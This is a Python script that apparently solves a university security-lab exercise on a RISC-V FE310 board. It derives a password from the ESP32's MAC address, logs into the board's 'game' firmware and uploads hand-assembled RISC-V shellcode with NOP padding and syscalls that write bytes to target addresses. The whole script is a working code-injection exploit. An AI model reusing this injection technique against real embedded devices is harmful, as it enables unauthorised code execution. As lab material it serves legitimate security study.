#!/usr/bin/env python3
try:
    import serial
    import re
    import os
    import time
    import pylink
    import binascii
except ModuleNotFoundError:
    print("Python is missing the serial library")
    quit()
    
riscv_console = '/dev/ttyACM0'
esp32_console = '/dev/ttyACM1'
BAUDRATE = 115200
utf8 = 'utf-8'

lengthi = 2049#bufferlength in int
marker_target = 1536#x600 in int
marker_offset = 1792#x700 in int
lengthb = b"\x00\x00\x08\x00"
nop = b"\x13\x00\x00\x00"#no operation: addi    x0,x0,0
execbyte = b"\x01"#something != \x00
    
def reset_board():
    shell_command = "echo -en '\\rnh\\nrnh\\nexit\\n' | JLinkExe -device fe310 -If JTAG -speed 4000 -Autoconnect 1 > /dev/null"
    ret = os.system(shell_command)
    print(color.RED + 'Reset board: '+(lambda x: 'success' if (x==0) else 'failed')(ret) + color.END)
    return
    
def reset_board_pylink():
    jlink = pylink.JLink()
    jlink.open()
    jlink.connect('FE310')
    jlink.reset(halt=False)
    jlink.close()

def obtain_mac(esp32):
    while True:
        try:
            line = esp32.readline().decode(utf8)
            mac_matcher = re.compile('wifi: mode : sta \(([^)]+)\)')
            match = re.search(mac_matcher,line)
            if match:
                return match.group(1)
        except Exception as e: 
            print(e)
            break

def send_secret(riscv, secret):
    riscv.flushInput()
    riscv.write(bytes('\n', utf8))#reset buffer
    riscv.write(bytes(secret, utf8))
    
def wait_for_ack(ser, msg):
    while True:
        line = ser.readline().decode(utf8)
        if msg in line:
            print ("Received: "+msg)
            return

def shell():
    os.system("picocom -b 115200 -l --quiet /dev/ttyACM0")
    
def convert(intv):
    b = bytearray.fromhex(format(intv, 'x'))
    b.reverse()
    #print(int(binascii.hexlify(b), 16))

def get_syscall_code():
    bytecode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    bytecode.extend(b"\x13\x65\x55\x00")#a0=5 syscall
    bytecode.extend(b"\xb3\x05\xc0\x00")#c.mv a1,a2             [a2 is 0800 1800]
    bytecode.extend(b"\x93\x85\x05\xf0")#addi a1,(a1-100)       [set offset byte addr]
    bytecode.extend(b"\x73\x00\x00\x00")#ecall
    bytecode.extend(b"\x13\x05\x15\x00")#addi a0,1
    bytecode.extend(b"\xb3\x05\xc0\x00")#c.mv a1,a2             [set write target addr]
    bytecode.extend(b"\x93\x85\x05\xe0")#addi a1,(a2-200)
    bytecode.extend(b"\x73\x00\x00\x00")#ecall
    #.............................................
    bytecode.extend(b"\x13\x05\xf5\xff")#addi    a0, a0,-0x1                    #repeats always from now
    bytecode.extend(b"\xb3\x05\xc0\x00")#c.mv a1,a2                             #repeats always
    bytecode.extend(b"\x93\x85\x45\xf0")#addi    a1, a2,-0xFF [3rd byte changes; need to go 4 byte steps or error]
    bytecode.extend(b"\x73\x00\x00\x00")#ecall                                  #repeats always
    bytecode.extend(b"\x13\x05\x15\x00")#addi a0,1                              #repeats always
    bytecode.extend(b"\xb3\x05\xc0\x00")#c.mv a1,a2                             #repeats always
    bytecode.extend(b"\x93\x85\x25\xe0")#addi a1,(a1-200)
    bytecode.extend(b"\x73\x00\x00\x00")#ecall                                  #repeats always
    return bytecode
    
def get_exit_code():
    bytecode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    bytecode.extend(b"\x13\x65\x15\x00") #ori a0,a0,0x1
    bytecode.extend(b"\x73\x00\x00\x00")#ecall
    return bytecode

def get_offset_bytes(targetb):
    bytecode = bytearray(4)#needs to be reverse order
    bytecode[0] = get_offset_by_target(targetb)
    return bytecode
    
def get_offset_by_target(goalb):
    offset = (0 - ord(goalb))% 256
    return offset
    
def get_userspace_code(length):
    #we use register a0 to select our syscall
    code = get_syscall_code()
    #add nops until target marker, but leave space for 3 instr.
    for x in range(len(code),marker_target-3*len(nop),len(nop)):
        code.extend(nop)
    code.extend(get_exit_code())
    code.extend(b"\xFF\xFF\xFF\xFF")
    for x in range(len(code),marker_offset,len(nop)):
        code.extend(nop)
    code.extend(get_offset_bytes(b"\x41"))
    code.extend(get_offset_bytes(b"\x42"))
    for x in range(len(code),length-1,len(nop)):
        code.extend(nop)
    #execbyte is needed to make the firmware execute the code
    code.extend(execbyte)
    return code
    
class color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

if __name__ == '__main__':
    riscv = serial.Serial(riscv_console, BAUDRATE, timeout=1)
    esp32 = serial.Serial(esp32_console, BAUDRATE, timeout=1)
    reset_board_pylink()
    mac = obtain_mac(esp32)
    esp32.close()
    print(color.RED + "MAC found: " +mac+ color.END)
    secret = "__SecLab__"+mac +"\r\n"
    wait_for_ack(riscv, 'Welcome.')
    print(color.BLUE + "\t\tSent: Secret Password" + color.END)
    send_secret(riscv, secret)
    wait_for_ack(riscv, 'Greetings Professor Falken. Shall we play a game?')
    input("Press ENTER to continue...")
    print(color.BLUE + "\t\tSent: l to load game"+ color.END)
    riscv.write(bytes('l', utf8))
    wait_for_ack(riscv, 'So, you brought your own, he?')
    #syscall = int(input("Enter syscall id: "))
    code = get_userspace_code(lengthi)
    print(color.BLUE + "\t\tSent: Game code" + color.END)
    riscv.flushInput()
    riscv.write(lengthb)
    riscv.write(code)
    wait_for_ack(riscv, 'What do you want to play?')
    print(color.RED + "Successfully went back to menu" + color.END)
    riscv.close()
    print(color.RED + "Task done, switching to picocom console, exit with CRTL+A+X" + color.END)
    shell()
"""
switcher = {
    1: b"\x15",
    2: b"\x25",
    3: b"\x35",
    4: b"\x45",
    5: b"\x55",
    6: b"\x65"
    }"""
#a1 = 08001030, a2 = 3
